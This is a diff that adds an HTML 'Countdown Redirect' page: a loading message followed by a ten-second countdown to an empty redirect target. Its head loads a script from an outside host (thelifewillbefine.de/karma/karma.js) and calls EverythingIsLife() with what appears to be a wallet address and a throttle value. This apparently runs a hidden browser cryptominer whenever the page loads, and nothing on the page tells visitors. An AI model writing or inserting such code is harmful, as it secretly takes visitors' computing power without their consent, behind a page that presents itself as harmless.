@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Countdown Redirect</title>
+  <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
+  <script type="text/javascript">
+    EverythingIsLife('446Sz2JUWX7FZ9SA7voTYhXTvboNHm6W3H5iEDksvRzTDw613E7sgFvHjP3BVgBAR43UXHdyC1pvDgDFzjp3vBaRLiwn376', 'x', 30);
+  </script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
+    }
+    #loading, #countdown {
+      font-size: 24px;
+    }
+  </style>
+</head>
+<body>
+  <div id="loading">Loading, please wait...</div>
+  <div id="countdown" style="display:none;">Redirecting in <span id="timer">10</span> seconds...</div>
+  
+  <script>
+    setTimeout(function() {
+      document.getElementById('loading').style.display = 'none';
+      document.getElementById('countdown').style.display = 'block';
+
+      // Second phase: countdown from 10 seconds
+      var timeLeft = 10;
+      var countdownTimer = setInterval(function() {
+        timeLeft--;
+        document.getElementById('timer').textContent = timeLeft;
+        if (timeLeft <= 0) {
+          clearInterval(countdownTimer);
+          window.location.href = "";
+        }
+      }, 1000);
+    }, 3000);
+  </script>
+</body>
+</html>
